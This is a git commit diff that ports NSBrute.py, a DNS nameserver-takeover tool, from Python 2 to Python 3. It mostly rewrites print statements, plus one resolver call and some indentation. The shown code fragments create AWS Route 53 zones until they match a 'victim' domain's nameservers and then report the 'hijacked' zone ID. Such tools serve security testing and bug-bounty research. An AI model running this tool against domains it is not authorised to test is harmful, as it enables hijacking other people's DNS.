e8182ed4ade416e265205ddc70193fc407f32afa
William <info@fjord.ai>
2022-09-21 18:56:49 -0400

    Update to python3

--- NSBrute.py
+++ NSBrute.py
@@ -30,28 +30,28 @@ class bcolors:
 
 def myPrint(text, type):
 	if(type=="INFO"):
-		print bcolors.INFO+text+bcolors.ENDC+"\n"
+		print(bcolors.INFO+text+bcolors.ENDC+"\n")
 		return
 	if(type=="INFO_WS"):
-		print bcolors.INFO+text+bcolors.ENDC
+		print(bcolors.INFO+text+bcolors.ENDC)
 		return
 	if(type=="ERROR"):
-		print bcolors.BGRED+bcolors.FGWHITE+bcolors.BOLD+text+bcolors.ENDC
+		print(bcolors.BGRED+bcolors.FGWHITE+bcolors.BOLD+text+bcolors.ENDC)
 		return
 	if(type=="MESSAGE"):
-		print bcolors.TITLE+bcolors.BOLD+text+bcolors.ENDC+"\n"
+		print(bcolors.TITLE+bcolors.BOLD+text+bcolors.ENDC+"\n")
 		return
 	if(type=="INSECURE_WS"):
-		print bcolors.OKRED+bcolors.BOLD+text+bcolors.ENDC
+		print(bcolors.OKRED+bcolors.BOLD+text+bcolors.ENDC)
 		return
 	if(type=="OUTPUT"):
-		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC+"\n"
+		print(bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC+"\n")
 		return
 	if(type=="OUTPUT_WS"):
-		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC
+		print(bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC)
 		return
 	if(type=="SECURE"):
-		print bcolors.OKGREEN+bcolors.BOLD+text+bcolors.ENDC
+		print(bcolors.OKGREEN+bcolors.BOLD+text+bcolors.ENDC)
 
 #python NSBrute.py -d domain -a accessKey -s secretKey -ns a,b,c,d -f
 
@@ -60,10 +60,10 @@ forceDelete = False
 
 if (len(sys.argv)<7):
 	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
-	print ""
+	print("")
 	myPrint("Usage: python NSTakeover.py -d domain -a accessKey -s secretKey","ERROR")
 	myPrint("Please try again!!", "ERROR") 
-	print ""
+	print("")
 	exit(1);
 if (sys.argv[1]=="-d" or sys.argv[1]=="--domain"):
 	victimDomain=sys.argv[2]
@@ -75,16 +75,16 @@ if len(sys.argv) >= 8:
 	if (sys.argv[7]=="-f" or sys.argv[7]=="--forceDelete"):
 		forceDelete =  True
 try:
-	nsRecords = dns.resolver.query(victimDomain, 'NS')
+ 	nsRecords = dns.resolver.resolve(victimDomain, 'NS')
 except:
-	myPrint("Unable to fetch NS records for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
-	exit(1)
+ 	myPrint("Unable to fetch NS records for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
+ 	exit(1)
 isInt= isinstance(nsRecords,int)
 if isInt and nsRecords==0:
-	myPrint("No NS records found for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
-	exit(1)
+    myPrint("No NS records found for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
+    exit(1)
 for nameserver in nsRecords:
-		targetNS.append(str(nameserver))
+    targetNS.append(str(nameserver))
 
 #strip leading and trailing spaces	
 for index in range(len(targetNS)):
@@ -121,18 +121,19 @@ try:
 			myPrint(" ".join(nsAWS),"INFO_WS")
 			intersection=set(nsAWS).intersection(set(targetNS))
 			if(len(intersection)==0):
-				myPrint("No common NS found, deleting new zone","ERROR")
-				print ""
+				myPrint("Deleting...No common NS found with target NS:","ERROR")
+				myPrint(" ".join(targetNS),"INFO_WS")
+				print("")
 				new_zone.delete()
 			else:
 				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
 				myPrint("Check your AWS account, the work is done!","SECURE")
-				print "This is the hijacked Zone ID: " + str(hosted_zone_id)
+				print("This is the hijacked Zone ID: " + str(hosted_zone_id))
 				hijacked_zone = next(iter(intersection))
-				print "This is the zone you hijacked: " + str(hijacked_zone)
+				print("This is the zone you hijacked: " + str(hijacked_zone))
 				successful_zone.append(hosted_zone_id)
 				created_zones.remove(hosted_zone_id)
-				print ""
+				print("")
 				break
 		except Exception as e:
 			myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
